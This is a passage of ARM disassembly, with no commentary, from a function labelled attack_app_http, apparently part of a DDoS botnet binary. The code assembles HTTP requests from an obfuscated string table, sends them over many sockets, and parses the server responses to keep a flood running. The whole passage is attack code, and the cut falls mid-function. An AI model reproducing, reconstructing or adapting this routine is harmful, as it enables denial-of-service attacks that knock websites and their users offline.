    8914:	e59d0014 	ldr	r0, [sp, #20]
    8918:	eb003b04 	bl	17530 <util_strlen>
    891c:	e285be59 	add	fp, r5, #1424	; 0x590
    8920:	e59dc014 	ldr	ip, [sp, #20]
    8924:	e28bb007 	add	fp, fp, #7
    8928:	e08c0000 	add	r0, ip, r0
    892c:	e1a0100b 	mov	r1, fp
    8930:	eb003b08 	bl	17558 <util_strcpy>
    8934:	e59d0014 	ldr	r0, [sp, #20]
    8938:	eb003afc 	bl	17530 <util_strlen>
    893c:	e59de014 	ldr	lr, [sp, #20]
    8940:	e59f16d0 	ldr	r1, [pc, #1744]	; 9018 <attack_app_http+0xe48>
    8944:	e08e0000 	add	r0, lr, r0
    8948:	eb003b02 	bl	17558 <util_strcpy>
    894c:	e59d0014 	ldr	r0, [sp, #20]
    8950:	eb003af6 	bl	17530 <util_strlen>
    8954:	e59d1014 	ldr	r1, [sp, #20]
    8958:	e0810000 	add	r0, r1, r0
    895c:	e2851f85 	add	r1, r5, #532	; 0x214
    8960:	eb003afc 	bl	17558 <util_strcpy>
    8964:	e59d0014 	ldr	r0, [sp, #20]
    8968:	eb003af0 	bl	17530 <util_strlen>
    896c:	e59d2014 	ldr	r2, [sp, #20]
    8970:	e59f16a4 	ldr	r1, [pc, #1700]	; 901c <attack_app_http+0xe4c>
    8974:	e0820000 	add	r0, r2, r0
    8978:	eb003af6 	bl	17558 <util_strcpy>
    897c:	e59d0014 	ldr	r0, [sp, #20]
    8980:	eb003aea 	bl	17530 <util_strlen>
    8984:	e59d3014 	ldr	r3, [sp, #20]
    8988:	e2851014 	add	r1, r5, #20
    898c:	e0830000 	add	r0, r3, r0
    8990:	eb003af0 	bl	17558 <util_strcpy>
    8994:	e59d0014 	ldr	r0, [sp, #20]
    8998:	eb003ae4 	bl	17530 <util_strlen>
    899c:	e59dc014 	ldr	ip, [sp, #20]
    89a0:	e59f1678 	ldr	r1, [pc, #1656]	; 9020 <attack_app_http+0xe50>
    89a4:	e08c0000 	add	r0, ip, r0
    89a8:	eb003aea 	bl	17558 <util_strcpy>
    89ac:	e59d0014 	ldr	r0, [sp, #20]
    89b0:	eb003ade 	bl	17530 <util_strlen>
    89b4:	e59de014 	ldr	lr, [sp, #20]
    89b8:	e2851fc5 	add	r1, r5, #788	; 0x314
    89bc:	e08e0000 	add	r0, lr, r0
    89c0:	e2811001 	add	r1, r1, #1
    89c4:	eb003ae3 	bl	17558 <util_strcpy>
    89c8:	e59d0014 	ldr	r0, [sp, #20]
    89cc:	eb003ad7 	bl	17530 <util_strlen>
    89d0:	e59d1014 	ldr	r1, [sp, #20]
    89d4:	e0810000 	add	r0, r1, r0
    89d8:	e59f1650 	ldr	r1, [pc, #1616]	; 9030 <attack_app_http+0xe60>
    89dc:	eb003add 	bl	17558 <util_strcpy>
    89e0:	e3a00039 	mov	r0, #57	; 0x39
    89e4:	eb003510 	bl	15e2c <table_unlock_val>
    89e8:	e59d0014 	ldr	r0, [sp, #20]
    89ec:	eb003acf 	bl	17530 <util_strlen>
    89f0:	e1a01009 	mov	r1, r9
    89f4:	e1a04000 	mov	r4, r0
    89f8:	e3a00039 	mov	r0, #57	; 0x39
    89fc:	eb0034d9 	bl	15d68 <table_retrieve_val>
    8a00:	e59d2014 	ldr	r2, [sp, #20]
    8a04:	e1a01000 	mov	r1, r0
    8a08:	e0820004 	add	r0, r2, r4
    8a0c:	eb003ad1 	bl	17558 <util_strcpy>
    8a10:	e3a00039 	mov	r0, #57	; 0x39
    8a14:	eb0034dc 	bl	15d8c <table_lock_val>
    8a18:	e59d0014 	ldr	r0, [sp, #20]
    8a1c:	eb003ac3 	bl	17530 <util_strlen>
    8a20:	e59d3014 	ldr	r3, [sp, #20]
    8a24:	e59f1604 	ldr	r1, [pc, #1540]	; 9030 <attack_app_http+0xe60>
    8a28:	e0830000 	add	r0, r3, r0
    8a2c:	eb003ac9 	bl	17558 <util_strcpy>
    8a30:	e3a0003a 	mov	r0, #58	; 0x3a
    8a34:	eb0034fc 	bl	15e2c <table_unlock_val>
    8a38:	e59d0014 	ldr	r0, [sp, #20]
    8a3c:	eb003abb 	bl	17530 <util_strlen>
    8a40:	e1a01009 	mov	r1, r9
    8a44:	e1a04000 	mov	r4, r0
    8a48:	e3a0003a 	mov	r0, #58	; 0x3a
    8a4c:	eb0034c5 	bl	15d68 <table_retrieve_val>
    8a50:	e59dc014 	ldr	ip, [sp, #20]
    8a54:	e1a01000 	mov	r1, r0
    8a58:	e08c0004 	add	r0, ip, r4
    8a5c:	eb003abd 	bl	17558 <util_strcpy>
    8a60:	e3a0003a 	mov	r0, #58	; 0x3a
    8a64:	eb0034c8 	bl	15d8c <table_lock_val>
    8a68:	e59d0014 	ldr	r0, [sp, #20]
    8a6c:	eb003aaf 	bl	17530 <util_strlen>
    8a70:	e59de014 	ldr	lr, [sp, #20]
    8a74:	e59f15b4 	ldr	r1, [pc, #1460]	; 9030 <attack_app_http+0xe60>
    8a78:	e08e0000 	add	r0, lr, r0
    8a7c:	eb003ab5 	bl	17558 <util_strcpy>
    8a80:	e3a0003b 	mov	r0, #59	; 0x3b
    8a84:	eb0034e8 	bl	15e2c <table_unlock_val>
    8a88:	e59d0014 	ldr	r0, [sp, #20]
    8a8c:	eb003aa7 	bl	17530 <util_strlen>
    8a90:	e1a01009 	mov	r1, r9
    8a94:	e1a04000 	mov	r4, r0
    8a98:	e3a0003b 	mov	r0, #59	; 0x3b
    8a9c:	eb0034b1 	bl	15d68 <table_retrieve_val>
    8aa0:	e59d2014 	ldr	r2, [sp, #20]
    8aa4:	e1a01000 	mov	r1, r0
    8aa8:	e0820004 	add	r0, r2, r4
    8aac:	eb003aa9 	bl	17558 <util_strcpy>
    8ab0:	e3a0003b 	mov	r0, #59	; 0x3b
    8ab4:	eb0034b4 	bl	15d8c <table_lock_val>
    8ab8:	e59d0014 	ldr	r0, [sp, #20]
    8abc:	eb003a9b 	bl	17530 <util_strlen>
    8ac0:	e59d3014 	ldr	r3, [sp, #20]
    8ac4:	e59f1564 	ldr	r1, [pc, #1380]	; 9030 <attack_app_http+0xe60>
    8ac8:	e0830000 	add	r0, r3, r0
    8acc:	eb003aa1 	bl	17558 <util_strcpy>
    8ad0:	e59dc03c 	ldr	ip, [sp, #60]	; 0x3c
    8ad4:	e15c0009 	cmp	ip, r9
    8ad8:	0a000033 	beq	8bac <attack_app_http+0x9dc>
    8adc:	e3a0003c 	mov	r0, #60	; 0x3c
    8ae0:	eb0034d1 	bl	15e2c <table_unlock_val>
    8ae4:	e59d0014 	ldr	r0, [sp, #20]
    8ae8:	eb003a90 	bl	17530 <util_strlen>
    8aec:	e1a01009 	mov	r1, r9
    8af0:	e1a04000 	mov	r4, r0
    8af4:	e3a0003c 	mov	r0, #60	; 0x3c
    8af8:	eb00349a 	bl	15d68 <table_retrieve_val>
    8afc:	e59de014 	ldr	lr, [sp, #20]
    8b00:	e1a01000 	mov	r1, r0
    8b04:	e08e0004 	add	r0, lr, r4
    8b08:	eb003a92 	bl	17558 <util_strcpy>
    8b0c:	e3a0003c 	mov	r0, #60	; 0x3c
    8b10:	eb00349d 	bl	15d8c <table_lock_val>
    8b14:	e59d0014 	ldr	r0, [sp, #20]
    8b18:	eb003a84 	bl	17530 <util_strlen>
    8b1c:	e59d1014 	ldr	r1, [sp, #20]
    8b20:	e0810000 	add	r0, r1, r0
    8b24:	e59f1504 	ldr	r1, [pc, #1284]	; 9030 <attack_app_http+0xe60>
    8b28:	eb003a8a 	bl	17558 <util_strcpy>
    8b2c:	e59d0014 	ldr	r0, [sp, #20]
    8b30:	eb003a7e 	bl	17530 <util_strlen>
    8b34:	e1a01009 	mov	r1, r9
    8b38:	e1a04000 	mov	r4, r0
    8b3c:	e3a00041 	mov	r0, #65	; 0x41
    8b40:	eb003488 	bl	15d68 <table_retrieve_val>
    8b44:	e59d2014 	ldr	r2, [sp, #20]
    8b48:	e1a01000 	mov	r1, r0
    8b4c:	e0820004 	add	r0, r2, r4
    8b50:	eb003a80 	bl	17558 <util_strcpy>
    8b54:	e59d0014 	ldr	r0, [sp, #20]
    8b58:	eb003a74 	bl	17530 <util_strlen>
    8b5c:	e59d3014 	ldr	r3, [sp, #20]
    8b60:	e59f14b0 	ldr	r1, [pc, #1200]	; 9018 <attack_app_http+0xe48>
    8b64:	e0830000 	add	r0, r3, r0
    8b68:	eb003a7a 	bl	17558 <util_strcpy>
    8b6c:	e59d003c 	ldr	r0, [sp, #60]	; 0x3c
    8b70:	eb003a6e 	bl	17530 <util_strlen>
    8b74:	e1a04000 	mov	r4, r0
    8b78:	e59d0014 	ldr	r0, [sp, #20]
    8b7c:	eb003a6b 	bl	17530 <util_strlen>
    8b80:	e59dc014 	ldr	ip, [sp, #20]
    8b84:	e3a0100a 	mov	r1, #10
    8b88:	e08c2000 	add	r2, ip, r0
    8b8c:	e1a00004 	mov	r0, r4
    8b90:	eb003ba3 	bl	17a24 <util_itoa>
    8b94:	e59d0014 	ldr	r0, [sp, #20]
    8b98:	eb003a64 	bl	17530 <util_strlen>
    8b9c:	e59de014 	ldr	lr, [sp, #20]
    8ba0:	e59f1488 	ldr	r1, [pc, #1160]	; 9030 <attack_app_http+0xe60>
    8ba4:	e08e0000 	add	r0, lr, r0
    8ba8:	eb003a6a 	bl	17558 <util_strcpy>
    8bac:	e5963010 	ldr	r3, [r6, #16]
    8bb0:	e3530000 	cmp	r3, #0
    8bb4:	da000027 	ble	8c58 <attack_app_http+0xa88>
    8bb8:	e59d0014 	ldr	r0, [sp, #20]
    8bbc:	eb003a5b 	bl	17530 <util_strlen>
    8bc0:	e59d1014 	ldr	r1, [sp, #20]
    8bc4:	e0810000 	add	r0, r1, r0
    8bc8:	e59f1454 	ldr	r1, [pc, #1108]	; 9024 <attack_app_http+0xe54>
    8bcc:	eb003a61 	bl	17558 <util_strcpy>
    8bd0:	e5963010 	ldr	r3, [r6, #16]
    8bd4:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    8bd8:	e3530000 	cmp	r3, #0
    8bdc:	e582916c 	str	r9, [r2, #364]	; 0x16c
    8be0:	da000016 	ble	8c40 <attack_app_http+0xa70>
    8be4:	e59d0014 	ldr	r0, [sp, #20]
    8be8:	eb003a50 	bl	17530 <util_strlen>
    8bec:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    8bf0:	e593116c 	ldr	r1, [r3, #364]	; 0x16c
    8bf4:	e59dc014 	ldr	ip, [sp, #20]
    8bf8:	e1a01381 	lsl	r1, r1, #7
    8bfc:	e2811d17 	add	r1, r1, #1472	; 0x5c0
    8c00:	e08c0000 	add	r0, ip, r0
    8c04:	e0851001 	add	r1, r5, r1
    8c08:	eb003a52 	bl	17558 <util_strcpy>
    8c0c:	e59d0014 	ldr	r0, [sp, #20]
    8c10:	eb003a46 	bl	17530 <util_strlen>
    8c14:	e59de014 	ldr	lr, [sp, #20]
    8c18:	e59f1408 	ldr	r1, [pc, #1032]	; 9028 <attack_app_http+0xe58>
    8c1c:	e08e0000 	add	r0, lr, r0
    8c20:	eb003a4c 	bl	17558 <util_strcpy>
    8c24:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8c28:	e591316c 	ldr	r3, [r1, #364]	; 0x16c
    8c2c:	e5962010 	ldr	r2, [r6, #16]
    8c30:	e283c001 	add	ip, r3, #1
    8c34:	e152000c 	cmp	r2, ip
    8c38:	e581c16c 	str	ip, [r1, #364]	; 0x16c
    8c3c:	caffffe8 	bgt	8be4 <attack_app_http+0xa14>
    8c40:	e59d0014 	ldr	r0, [sp, #20]
    8c44:	eb003a39 	bl	17530 <util_strlen>
    8c48:	e59d2014 	ldr	r2, [sp, #20]
    8c4c:	e59f13dc 	ldr	r1, [pc, #988]	; 9030 <attack_app_http+0xe60>
    8c50:	e0820000 	add	r0, r2, r0
    8c54:	eb003a3f 	bl	17558 <util_strcpy>
    8c58:	e59d0014 	ldr	r0, [sp, #20]
    8c5c:	eb003a33 	bl	17530 <util_strlen>
    8c60:	e59d3014 	ldr	r3, [sp, #20]
    8c64:	e59f13c4 	ldr	r1, [pc, #964]	; 9030 <attack_app_http+0xe60>
    8c68:	e0830000 	add	r0, r3, r0
    8c6c:	eb003a39 	bl	17558 <util_strcpy>
    8c70:	e59dc03c 	ldr	ip, [sp, #60]	; 0x3c
    8c74:	e35c0000 	cmp	ip, #0
    8c78:	0a000005 	beq	8c94 <attack_app_http+0xac4>
    8c7c:	e59d0014 	ldr	r0, [sp, #20]
    8c80:	eb003a2a 	bl	17530 <util_strlen>
    8c84:	e59de014 	ldr	lr, [sp, #20]
    8c88:	e59d103c 	ldr	r1, [sp, #60]	; 0x3c
    8c8c:	e08e0000 	add	r0, lr, r0
    8c90:	eb003a30 	bl	17558 <util_strcpy>
    8c94:	e2854e5a 	add	r4, r5, #1440	; 0x5a0
    8c98:	e1a0000b 	mov	r0, fp
    8c9c:	e1a01004 	mov	r1, r4
    8ca0:	eb003b1a 	bl	17910 <util_strcmp>
    8ca4:	e3500000 	cmp	r0, #0
    8ca8:	0a00028d 	beq	96e4 <attack_app_http+0x1514>
    8cac:	e59d0014 	ldr	r0, [sp, #20]
    8cb0:	e51645ac 	ldr	r4, [r6, #-1452]	; 0xfffffa54
    8cb4:	eb003a1d 	bl	17530 <util_strlen>
    8cb8:	e59d1014 	ldr	r1, [sp, #20]
    8cbc:	e1a02000 	mov	r2, r0
    8cc0:	e3a03901 	mov	r3, #16384	; 0x4000
    8cc4:	e1a00004 	mov	r0, r4
    8cc8:	eb003fb2 	bl	18b98 <__libc_send>
    8ccc:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8cd0:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    8cd4:	e1a022ac 	lsr	r2, ip, #5
    8cd8:	e2811070 	add	r1, r1, #112	; 0x70
    8cdc:	e1a02102 	lsl	r2, r2, #2
    8ce0:	e0822001 	add	r2, r2, r1
    8ce4:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8ce8:	e3a03001 	mov	r3, #1
    8cec:	e20c001f 	and	r0, ip, #31
    8cf0:	e1811013 	orr	r1, r1, r3, lsl r0
    8cf4:	e2833005 	add	r3, r3, #5
    8cf8:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8cfc:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    8d00:	e15c0008 	cmp	ip, r8
    8d04:	e59d2034 	ldr	r2, [sp, #52]	; 0x34
    8d08:	c28c8001 	addgt	r8, ip, #1
    8d0c:	e50625a0 	str	r2, [r6, #-1440]	; 0xfffffa60
    8d10:	eafffe41 	b	861c <attack_app_http+0x44c>
    8d14:	e51635a4 	ldr	r3, [r6, #-1444]	; 0xfffffa5c
    8d18:	e59d1034 	ldr	r1, [sp, #52]	; 0x34
    8d1c:	e0633001 	rsb	r3, r3, r1
    8d20:	e353001e 	cmp	r3, #30
    8d24:	8afffe36 	bhi	8604 <attack_app_http+0x434>
    8d28:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8d2c:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8d30:	e1a022ac 	lsr	r2, ip, #5
    8d34:	e1a02102 	lsl	r2, r2, #2
    8d38:	e2833070 	add	r3, r3, #112	; 0x70
    8d3c:	e0822003 	add	r2, r2, r3
    8d40:	eafffe7e 	b	8740 <attack_app_http+0x570>
    8d44:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8d48:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8d4c:	e1a022ac 	lsr	r2, ip, #5
    8d50:	e2833070 	add	r3, r3, #112	; 0x70
    8d54:	e1a02102 	lsl	r2, r2, #2
    8d58:	e0822003 	add	r2, r2, r3
    8d5c:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8d60:	e20c001f 	and	r0, ip, #31
    8d64:	e3a03001 	mov	r3, #1
    8d68:	e1811013 	orr	r1, r1, r3, lsl r0
    8d6c:	e15c0008 	cmp	ip, r8
    8d70:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8d74:	dafffe28 	ble	861c <attack_app_http+0x44c>
    8d78:	e08c8003 	add	r8, ip, r3
    8d7c:	eafffe77 	b	8760 <attack_app_http+0x590>
    8d80:	eb003e4f 	bl	186c4 <__GI___errno_location>
    8d84:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8d88:	e2897d21 	add	r7, r9, #2112	; 0x840
    8d8c:	e3530b01 	cmp	r3, #1024	; 0x400
    8d90:	e1a0b000 	mov	fp, r0
    8d94:	e2877004 	add	r7, r7, #4
    8d98:	0a00003e 	beq	8e98 <attack_app_http+0xcc8>
    8d9c:	e3a03000 	mov	r3, #0
    8da0:	e58b3000 	str	r3, [fp]
    8da4:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8da8:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8dac:	e2612b01 	rsb	r2, r1, #1024	; 0x400
    8db0:	e2833901 	add	r3, r3, #16384	; 0x4000
    8db4:	e0871001 	add	r1, r7, r1
    8db8:	eb003f15 	bl	18a14 <__libc_recv>
    8dbc:	e3500000 	cmp	r0, #0
    8dc0:	0a00024b 	beq	96f4 <attack_app_http+0x1524>
    8dc4:	e3700001 	cmn	r0, #1
    8dc8:	0a000252 	beq	9718 <attack_app_http+0x1548>
    8dcc:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    8dd0:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    8dd4:	e0844000 	add	r4, r4, r0
    8dd8:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8ddc:	e50a15a4 	str	r1, [sl, #-1444]	; 0xfffffa5c
    8de0:	ea000021 	b	8e6c <attack_app_http+0xc9c>
    8de4:	e59a8000 	ldr	r8, [sl]
    8de8:	e1550004 	cmp	r5, r4
    8dec:	b1a06005 	movlt	r6, r5
    8df0:	a1a06004 	movge	r6, r4
    8df4:	e0663005 	rsb	r3, r6, r5
    8df8:	e3580001 	cmp	r8, #1
    8dfc:	e58a300c 	str	r3, [sl, #12]
    8e00:	11a05003 	movne	r5, r3
    8e04:	0a00002c 	beq	8ebc <attack_app_http+0xcec>
    8e08:	e3550000 	cmp	r5, #0
    8e0c:	1a000007 	bne	8e30 <attack_app_http+0xc60>
    8e10:	e59a4008 	ldr	r4, [sl, #8]
    8e14:	e3540001 	cmp	r4, #1
    8e18:	0a000033 	beq	8eec <attack_app_http+0xd1c>
    8e1c:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e20:	e0663003 	rsb	r3, r6, r3
    8e24:	e3530000 	cmp	r3, #0
    8e28:	e58a300c 	str	r3, [sl, #12]
    8e2c:	0a000229 	beq	96d8 <attack_app_http+0x1508>
    8e30:	e3560000 	cmp	r6, #0
    8e34:	0a000011 	beq	8e80 <attack_app_http+0xcb0>
    8e38:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e3c:	e0664003 	rsb	r4, r6, r3
    8e40:	e1a02004 	mov	r2, r4
    8e44:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8e48:	e0871006 	add	r1, r7, r6
    8e4c:	e1a00007 	mov	r0, r7
    8e50:	eb003e36 	bl	18730 <__GI_memmove>
    8e54:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    8e58:	e3a03000 	mov	r3, #0
    8e5c:	e0892004 	add	r2, r9, r4
    8e60:	e3540000 	cmp	r4, #0
    8e64:	e5c23844 	strb	r3, [r2, #2116]	; 0x844
    8e68:	0a000004 	beq	8e80 <attack_app_http+0xcb0>
    8e6c:	e59a500c 	ldr	r5, [sl, #12]
    8e70:	e3550000 	cmp	r5, #0
    8e74:	caffffda 	bgt	8de4 <attack_app_http+0xc14>
    8e78:	e3a06000 	mov	r6, #0
    8e7c:	eaffffe1 	b	8e08 <attack_app_http+0xc38>
    8e80:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    8e84:	e3530007 	cmp	r3, #7
    8e88:	1afffe61 	bne	8814 <attack_app_http+0x644>
    8e8c:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e90:	e3530b01 	cmp	r3, #1024	; 0x400
    8e94:	1affffc0 	bne	8d9c <attack_app_http+0xbcc>
    8e98:	e2891d22 	add	r1, r9, #2176	; 0x880
    8e9c:	e2811004 	add	r1, r1, #4
    8ea0:	e1a00007 	mov	r0, r7
    8ea4:	e3a02d0f 	mov	r2, #960	; 0x3c0
    8ea8:	eb003e20 	bl	18730 <__GI_memmove>
    8eac:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8eb0:	e2434040 	sub	r4, r3, #64	; 0x40
    8eb4:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8eb8:	eaffffb7 	b	8d9c <attack_app_http+0xbcc>
    8ebc:	e3a01000 	mov	r1, #0
    8ec0:	e3a0003d 	mov	r0, #61	; 0x3d
    8ec4:	eb0033a7 	bl	15d68 <table_retrieve_val>
    8ec8:	e1a01004 	mov	r1, r4
    8ecc:	e1a02000 	mov	r2, r0
    8ed0:	e3a0300b 	mov	r3, #11
    8ed4:	e1a00007 	mov	r0, r7
    8ed8:	eb0039c2 	bl	175e8 <util_memsearch>
    8edc:	e3700001 	cmn	r0, #1
    8ee0:	1a0002b3 	bne	99b4 <attack_app_http+0x17e4>
    8ee4:	e59a500c 	ldr	r5, [sl, #12]
    8ee8:	eaffffc6 	b	8e08 <attack_app_http+0xc38>
    8eec:	e1a00007 	mov	r0, r7
    8ef0:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8ef4:	e59f2134 	ldr	r2, [pc, #308]	; 9030 <attack_app_http+0xe60>
    8ef8:	e3a03002 	mov	r3, #2
    8efc:	eb0039b9 	bl	175e8 <util_memsearch>
    8f00:	e3700001 	cmn	r0, #1
    8f04:	0affffc9 	beq	8e30 <attack_app_http+0xc60>
    8f08:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8f0c:	e59f211c 	ldr	r2, [pc, #284]	; 9030 <attack_app_http+0xe60>
    8f10:	e3a03002 	mov	r3, #2
    8f14:	e1a00007 	mov	r0, r7
    8f18:	eb0039b2 	bl	175e8 <util_memsearch>
    8f1c:	e089c000 	add	ip, r9, r0
    8f20:	e1a06000 	mov	r6, r0
    8f24:	e1a01006 	mov	r1, r6
    8f28:	e1a00007 	mov	r0, r7
    8f2c:	e59f20f8 	ldr	r2, [pc, #248]	; 902c <attack_app_http+0xe5c>
    8f30:	e1a03004 	mov	r3, r4
    8f34:	e5cc5842 	strb	r5, [ip, #2114]	; 0x842
    8f38:	eb0039aa 	bl	175e8 <util_memsearch>
    8f3c:	e3700001 	cmn	r0, #1
    8f40:	0a000006 	beq	8f60 <attack_app_http+0xd90>
    8f44:	e1a00007 	mov	r0, r7
    8f48:	e1a01006 	mov	r1, r6
    8f4c:	e59f20d8 	ldr	r2, [pc, #216]	; 902c <attack_app_http+0xe5c>
    8f50:	e1a03004 	mov	r3, r4
    8f54:	eb0039a3 	bl	175e8 <util_memsearch>
    8f58:	e0890000 	add	r0, r9, r0
    8f5c:	e5c05844 	strb	r5, [r0, #2116]	; 0x844
    8f60:	e1a00007 	mov	r0, r7
    8f64:	e3a01010 	mov	r1, #16
    8f68:	eb0039b9 	bl	17654 <util_atoi>
    8f6c:	e3500000 	cmp	r0, #0
    8f70:	0a0002fc 	beq	9b68 <attack_app_http+0x1998>
    8f74:	e2803002 	add	r3, r0, #2
    8f78:	e58a300c 	str	r3, [sl, #12]
    8f7c:	eaffffab 	b	8e30 <attack_app_http+0xc60>
    8f80:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8f84:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8f88:	e1a022ac 	lsr	r2, ip, #5
    8f8c:	e1a02102 	lsl	r2, r2, #2
    8f90:	e28ee070 	add	lr, lr, #112	; 0x70
    8f94:	e082200e 	add	r2, r2, lr
    8f98:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8f9c:	e20c001f 	and	r0, ip, #31
    8fa0:	e2433006 	sub	r3, r3, #6
    8fa4:	e1811013 	orr	r1, r1, r3, lsl r0
    8fa8:	e15c0008 	cmp	ip, r8
    8fac:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8fb0:	dafffd99 	ble	861c <attack_app_http+0x44c>
    8fb4:	e08c8003 	add	r8, ip, r3
    8fb8:	eafffde8 	b	8760 <attack_app_http+0x590>
    8fbc:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8fc0:	eb00494a 	bl	1b4f0 <__GI___libc_close>
    8fc4:	e3e03000 	mvn	r3, #0
    8fc8:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    8fcc:	e54a55a8 	strb	r5, [sl, #-1448]	; 0xfffffa58
    8fd0:	eafffe0f 	b	8814 <attack_app_http+0x644>
    8fd4:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8fd8:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    8fdc:	e1a022ac 	lsr	r2, ip, #5
    8fe0:	e2811070 	add	r1, r1, #112	; 0x70
    8fe4:	e1a02102 	lsl	r2, r2, #2
    8fe8:	e0822001 	add	r2, r2, r1
    8fec:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8ff0:	e20c001f 	and	r0, ip, #31
    8ff4:	e2433009 	sub	r3, r3, #9
    8ff8:	e1811013 	orr	r1, r1, r3, lsl r0
    8ffc:	e15c0008 	cmp	ip, r8
    9000:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    9004:	dafffd84 	ble	861c <attack_app_http+0x44c>
    9008:	e08c8003 	add	r8, ip, r3
    900c:	eafffdd3 	b	8760 <attack_app_http+0x590>
    9010:	00020548 	andeq	r0, r2, r8, asr #10
    9014:	88888889 	stmhi	r8, {r0, r3, r7, fp, pc}
    9018:	000206e4 	andeq	r0, r2, r4, ror #13
    901c:	00020518 	andeq	r0, r2, r8, lsl r5
    9020:	00020530 	andeq	r0, r2, r0, lsr r5
    9024:	0002054c 	andeq	r0, r2, ip, asr #10
    9028:	00020558 	andeq	r0, r2, r8, asr r5
    902c:	00020564 	andeq	r0, r2, r4, ror #10
    9030:	0002053c 	andeq	r0, r2, ip, lsr r5
    9034:	00020570 	andeq	r0, r2, r0, ror r5
    9038:	00020568 	andeq	r0, r2, r8, ror #10
    903c:	0002055c 	andeq	r0, r2, ip, asr r5
    9040:	00020578 	andeq	r0, r2, r8, ror r5
    9044:	00020544 	andeq	r0, r2, r4, asr #10
    9048:	00020584 	andeq	r0, r2, r4, lsl #11
    904c:	00020580 	andeq	r0, r2, r0, lsl #11
    9050:	e59d0010 	ldr	r0, [sp, #16]
    9054:	e3a01b0a 	mov	r1, #10240	; 0x2800
    9058:	eb003959 	bl	175c4 <util_zero>
    905c:	e3a03901 	mov	r3, #16384	; 0x4000
    9060:	e2833002 	add	r3, r3, #2
    9064:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9068:	e59d1010 	ldr	r1, [sp, #16]
    906c:	e3a02b0a 	mov	r2, #10240	; 0x2800
    9070:	eb003e67 	bl	18a14 <__libc_recv>
    9074:	e3e07c51 	mvn	r7, #20736	; 0x5100
    9078:	e250b000 	subs	fp, r0, #0
    907c:	e2477024 	sub	r7, r7, #36	; 0x24
    9080:	da00013c 	ble	9578 <attack_app_http+0x13a8>
    9084:	e59d0010 	ldr	r0, [sp, #16]
    9088:	e1a0100b 	mov	r1, fp
    908c:	e51f2058 	ldr	r2, [pc, #-88]	; 903c <attack_app_http+0xe6c>
    9090:	e3a03004 	mov	r3, #4
    9094:	eb003953 	bl	175e8 <util_memsearch>
    9098:	e3700001 	cmn	r0, #1
    909c:	1a000001 	bne	90a8 <attack_app_http+0xed8>
    90a0:	e35b0b0a 	cmp	fp, #10240	; 0x2800
    90a4:	bafffdda 	blt	8814 <attack_app_http+0x644>
    90a8:	e3a03004 	mov	r3, #4
    90ac:	e51f2078 	ldr	r2, [pc, #-120]	; 903c <attack_app_http+0xe6c>
    90b0:	e1a0100b 	mov	r1, fp
    90b4:	e59d0010 	ldr	r0, [sp, #16]
    90b8:	eb00394a 	bl	175e8 <util_memsearch>
    90bc:	e59dc010 	ldr	ip, [sp, #16]
    90c0:	e3a05000 	mov	r5, #0
    90c4:	e7cc5000 	strb	r5, [ip, r0]
    90c8:	e1a01005 	mov	r1, r5
    90cc:	e3a00047 	mov	r0, #71	; 0x47
    90d0:	eb003324 	bl	15d68 <table_retrieve_val>
    90d4:	e1a0100b 	mov	r1, fp
    90d8:	e1a02000 	mov	r2, r0
    90dc:	e59d0010 	ldr	r0, [sp, #16]
    90e0:	eb0039e6 	bl	17880 <util_stristr>
    90e4:	e3700001 	cmn	r0, #1
    90e8:	13a03002 	movne	r3, #2
    90ec:	158a3000 	strne	r3, [sl]
    90f0:	e1a01005 	mov	r1, r5
    90f4:	e3a00046 	mov	r0, #70	; 0x46
    90f8:	eb00331a 	bl	15d68 <table_retrieve_val>
    90fc:	e1a0100b 	mov	r1, fp
    9100:	e1a02000 	mov	r2, r0
    9104:	e59d0010 	ldr	r0, [sp, #16]
    9108:	eb0039dc 	bl	17880 <util_stristr>
    910c:	e3700001 	cmn	r0, #1
    9110:	13a03001 	movne	r3, #1
    9114:	158a3000 	strne	r3, [sl]
    9118:	e1a01005 	mov	r1, r5
    911c:	e3a00045 	mov	r0, #69	; 0x45
    9120:	e58a5004 	str	r5, [sl, #4]
    9124:	eb00330f 	bl	15d68 <table_retrieve_val>
    9128:	e1a0100b 	mov	r1, fp
    912c:	e1a02000 	mov	r2, r0
